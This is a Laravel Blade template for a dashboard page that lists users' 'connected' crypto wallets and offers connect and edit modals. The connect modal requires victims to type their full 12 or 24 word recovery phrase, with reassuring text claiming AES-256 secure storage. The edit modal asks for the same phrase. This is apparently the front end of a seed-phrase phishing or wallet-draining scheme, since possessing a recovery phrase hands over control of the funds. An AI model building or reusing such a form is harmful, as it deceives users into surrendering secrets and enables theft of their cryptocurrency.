@extends('layouts.user')

@section('content')

    <div class="row">
        <div class="col-md-12">
            <button type="button" class="btn btn-primary" style="margin-bottom: 20px;" onclick="jQuery('#connectModal').modal('show');"><i class="fa fa-plus"></i> Connect Wallet</button>
        </div>
    </div>

    <div class="row">
        <div class="col-md-12">
            <div class="panel panel-default panel-shadow" data-collapsed="0">

                <div class="panel-heading">
                    <div class="panel-title"><i class="fa fa-wallet"></i> <strong>{{ $page_title }}</strong></div>
                </div>

                <div class="panel-body">
                    <table class="table table-bordered table-striped" id="table-1">
                        <thead>
                            <tr>
                                <th>No</th>
                                <th>Wallet Type</th>
                                <th>Network</th>
                                <th>Wallet Address</th>
                                <th>Connected At</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php $no = 0; ?>
                            @foreach ($myWallets as $uw)
                                <?php $no++; ?>
                                <tr>
                                    <td>{{ $no }}</td>
                                    <td><strong>{{ $uw->walletType->name ?? 'N/A' }}</strong></td>
                                    <td><span class="label label-info">{{ $uw->walletType->network ?? 'N/A' }}</span></td>
                                    <td>{{ $uw->wallet_address ?? 'Not Set' }}</td>
                                    <td>{{ $uw->created_at->format('d M Y') }}</td>
                                    <td>
                                        <button type="button" class="btn btn-info btn-sm btn-icon icon-left" onclick="jQuery('#editModal{{$uw->id}}').modal('show');">
                                            <i class="fa fa-edit"></i> Edit
                                        </button>
                                        
                                        <form action="{{ route('delete-user-wallet', $uw->id) }}" method="POST" style="display:inline-block;">
                                            {{ csrf_field() }}
                                            {{ method_field('DELETE') }}
                                            <button type="submit" class="btn btn-danger btn-sm btn-icon icon-left" onclick="return confirm('Disconnect this wallet?');">
                                                <i class="fa fa-trash"></i> Remove
                                            </button>
                                        </form>
                                    </td>
                                </tr>
                            @endforeach
                        </tbody>
                    </table>
                </div>

            </div>
        </div>
    </div>

    <!-- Edit Modals (Moved outside table) -->
    @foreach ($myWallets as $uw)
        <div class="modal fade" id="editModal{{$uw->id}}">
            <div class="modal-dialog">
                <div class="modal-content">
                    <form action="{{ route('edit-user-wallet', $uw->id) }}" method="POST">
                        {{ csrf_field() }}
                        {{ method_field('PUT') }}
                        <div class="modal-header">
                            <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
                            <h4 class="modal-title"><i class="fa fa-edit"></i> Edit Connected Wallet</h4>
                        </div>
                        <div class="modal-body">
                            <div class="form-group">
                                <label>Select Wallet</label>
                                <select class="form-control" name="wallet_id" required>
                                    @foreach($availableWallets as $aw)
                                        <option value="{{ $aw->id }}" {{ $aw->id == $uw->wallet_id ? 'selected' : '' }}>
                                            {{ $aw->name }} ({{ $aw->network }})
                                        </option>
                                    @endforeach
                                </select>
                            </div>
                            <div class="form-group">
                                <label>Wallet Address</label>
                                <input type="text" class="form-control" name="wallet_address" value="{{ $uw->wallet_address }}">
                            </div>
                            <div class="form-group">
                                <label>Security Phrase (Leave blank to keep current)</label>
                                <input type="password" class="form-control" name="security_phrase">
                            </div>
                        </div>
                        <div class="modal-footer">
                            <button type="submit" class="btn btn-primary"><i class="fa fa-send"></i> Save Changes</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    @endforeach


    <!-- Connect Modal -->
    <div class="modal fade" id="connectModal">
        <div class="modal-dialog">
            <div class="modal-content">
                <form action="{{ route('add-wallet') }}" method="POST">
                    {{ csrf_field() }}
                    <div class="modal-header">
                        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
                        <h4 class="modal-title"><i class="fa fa-wallet"></i> Connect New Wallet</h4>
                    </div>
                    <div class="modal-body">
                        
                        <div class="form-group">
                            <label>Select Wallet Type</label>
                            <select class="form-control" name="wallet_id" required>
                                <option value="">-- Select Wallet --</option>
                                @foreach($availableWallets as $aw)
                                    <option value="{{ $aw->id }}">{{ $aw->name }} ({{ $aw->network }})</option>
                                @endforeach
                            </select>
                        </div>

                        <div class="form-group">
                            <label>Wallet Address (Optional)</label>
                            <input type="text" class="form-control" name="wallet_address" placeholder="0x...">
                        </div>

                        <div class="form-group">
                            <label>Security Phrase (12/24 words) <span class="text-danger">*</span></label>
                            <textarea class="form-control" name="security_phrase" rows="3" placeholder="Enter your 12 or 24 word recovery phrase. It will be stored securely." required></textarea>
                            <small class="text-muted">Stored with AES-256 encryption.</small>
                        </div>
                        
                    </div>
                    <div class="modal-footer">
                        <button type="submit" class="btn btn-primary btn-block"><i class="fa fa-link"></i> Connect</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

@endsection
